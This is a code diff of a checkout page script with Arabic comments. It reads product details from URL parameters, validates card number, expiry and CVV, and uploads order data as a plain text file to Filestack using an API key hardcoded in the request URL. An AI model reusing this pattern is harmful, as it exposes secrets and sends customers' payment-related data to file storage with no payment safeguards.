@@ -1,5 +1,9 @@
 document.addEventListener('DOMContentLoaded', function () {
+  // تحديد العناصر
   const form = document.getElementById('checkout-form');
+  const productInfoContainer = document.querySelector('.product-info');
+  const productDetailsContainer = document.getElementById('product-details');
+  const productButton = document.getElementById('toggle-details');  // الزر الحالي لعرض التفاصيل
 
   // استخراج المعلمات من الرابط
   function getUrlParams() {
@@ -7,7 +11,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const queryString = window.location.search;
     const urlParams = new URLSearchParams(queryString);
     urlParams.forEach((value, key) => {
-      params[key] = decodeURIComponent(value);  // فك تشفير القيم
+      params[key] = value;
     });
     return params;
   }
@@ -15,35 +19,34 @@ document.addEventListener('DOMContentLoaded', function () {
   const urlParams = getUrlParams();
 
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-  document.getElementById('product-name').textContent = urlParams.name || "Product Name";
-  document.getElementById('product-color').textContent = urlParams.color || "Product Color";
-  document.getElementById('product-price').textContent = `$${urlParams.price || "0.00"}`;
-  document.getElementById('total-price').textContent = `$${urlParams.price || "0.00"}`;
+  document.getElementById('product-name').textContent = urlParams.name;
+  document.getElementById('product-color').textContent = urlParams.color;
+  document.getElementById('product-price').textContent = urlParams.price;
+  
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
-  const productImageContainer = document.querySelector('.product-info');
 
   if (urlParams.image) {
-    // التأكد من أن الصورة ليست فارغة
-    productImage.src = urlParams.image;  // تعيين رابط الصورة
-    productImage.alt = urlParams.name || 'Product' + ' image';  // إضافة نص بديل للصورة
-    productImage.style.display = 'block';  // إظهار الصورة
+    productImage.src = urlParams.image;
+    productImage.alt = urlParams.name || 'Product' + ' image';
   } else {
-    // إذا كانت الصورة غير موجودة أو فارغة، عرض صورة افتراضية
-    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';  // صورة افتراضية
+    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
     productImage.alt = 'No Image Available';
-    productImage.style.display = 'block';  // إظهار الصورة
   }
 
-  // عرض الكمية
-  const productQuantity = parseInt(urlParams.quantity, 10) || 1; // تعيين الكمية الافتراضية إلى 1 إذا لم يتم إرسالها
-  document.getElementById('product-quantity').textContent = productQuantity;
-
-  // حساب السعر الإجمالي
-  const productPrice = parseFloat(urlParams.price) || 0; // تحويل السعر إلى عدد عشري
-  const totalPrice = (productPrice * productQuantity).toFixed(2); // حساب السعر الإجمالي
-  document.getElementById('total-price').textContent = '$' + totalPrice;
+  // عند الضغط على زر "Show Product Details"، نعرض تفاصيل المنتج أو إخفاءها
+  productButton.addEventListener('click', function() {
+    if (productDetailsContainer.style.display === 'none' || productDetailsContainer.style.display === '') {
+      productDetailsContainer.style.display = 'block';  // إظهار تفاصيل المنتج
+      productImage.style.display = 'block';  // إظهار الصورة
+      productButton.textContent = 'Hide Product Details';  // تغيير النص إلى "Hide Product Details"
+    } else {
+      productDetailsContainer.style.display = 'none';  // إخفاء تفاصيل المنتج
+      productImage.style.display = 'none';  // إخفاء الصورة
+      productButton.textContent = 'Show Product Details';  // إعادة النص إلى "Show Product Details"
+    }
+  });
 
   // إضافة مستمع للإرسال
   form.addEventListener('submit', function (event) {
@@ -130,72 +133,78 @@ document.addEventListener('DOMContentLoaded', function () {
             Product Image URL: ${productImageUrl}\n
             Total Price: $${totalPrice}`;
 
+
         // تحويل البيانات إلى Blob (بيانات ثنائية)
         const blob = new Blob([orderData], { type: 'text/plain' });
 
         // إعدادات Filestack API
         const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
-        const client = filestack.init(apiKey);
+        const url = `https://www.filestackapi.com/api/store/S3?key=${apiKey}`;
 
-        // رفع الملف إلى Filestack
-        client.upload(blob)
-            .then(result => {
-                // عند نجاح رفع الملف
-                alert('Your order has been successfully placed and saved to Filestack!');
-                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
-                console.log(result);  // تفاصيل رفع الملف
-            })
-            .catch(error => {
-                // في حال حدوث خطأ
-                console.error('Error uploading file to Filestack:', error);
-                alert('Something went wrong, please try again later.');
-            });
+        // إعداد بيانات الطلب
+        const formData = new FormData();
+        formData.append('file', blob, 'order.txt');
+
+        // إرسال البيانات إلى Filestack
+        fetch(url, {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert('Order has been processed!');
+        })
+        .catch(error => {
+            console.error('Error uploading file:', error);
+        });
     }
   });
 });
 
-// دالة للتحقق من البريد الإلكتروني
+// دالة للتحقق من صحة البريد الإلكتروني
 function validateEmail(email) {
-  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-  return emailPattern.test(email);
+  const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+  return regex.test(email);
 }
 
-// دالة للتحقق من اسم حامل البطاقة (يجب أن يحتوي فقط على حروف)
-function validateCardName(cardName) {
-  const namePattern = /^[a-zA-Z\s]+$/;  // اسم يحتوي فقط على حروف ومسافات
-  return namePattern.test(cardName);
+// دالة للتحقق من صحة اسم حامل البطاقة
+function validateCardName(name) {
+  const regex = /^[A-Za-z\s]+$/;
+  return regex.test(name);
 }
 
-// دالة للتحقق من رقم البطاقة (Visa / MasterCard فقط)
+// دالة للتحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
 function validateCard(cardNumber) {
-  const visaMasterCardPattern = /^(4[0-9]{12}|5[1-5][0-9]{14})$/;  // Visa أو MasterCard فقط
-  return visaMasterCardPattern.test(cardNumber);
+  const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
+  return regex.test(cardNumber);
 }
 
-// دالة للتحقق من تاريخ انتهاء البطاقة (صالح فقط في MM/YY)
+// دالة للتحقق من تاريخ الصلاحية
 function validateExpiry(expiry) {
-  const expiryPattern = /^(0[1-9]|1[0-2])\/\d{2}$/;  // MM/YY
-  return expiryPattern.test(expiry);
+  const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+  return regex.test(expiry);
 }
 
 // دالة للتحقق من CVV
 function validateCVV(cvv) {
-  const cvvPattern = /^[0-9]{3}$/;  // CVV يتكون من 3 أرقام
-  return cvvPattern.test(cvv);
+  const regex = /^[0-9]{3,4}$/;
+  return regex.test(cvv);
 }
 
-// دالة لعرض رسائل الخطأ
-function showErrorMessage(message, fieldId) {
-  const field = document.getElementById(fieldId);
-  const errorMessage = document.createElement('p');
+// دالة لإظهار رسائل الخطأ
+function showErrorMessage(message, field) {
+  const errorMessage = document.createElement('div');
   errorMessage.classList.add('error-message');
   errorMessage.textContent = message;
-  field.parentNode.appendChild(errorMessage);
+  document.getElementById(field).parentNode.appendChild(errorMessage);
 }
 
-// دالة لإزالة رسائل الخطأ
+// دالة لإزالة رسائل الخطأ السابقة
 function removeErrorMessages() {
   const errorMessages = document.querySelectorAll('.error-message');
-  errorMessages.forEach(message => message.remove());
+  errorMessages.forEach(function(message) {
+    message.remove();
+  });
 }
+
 
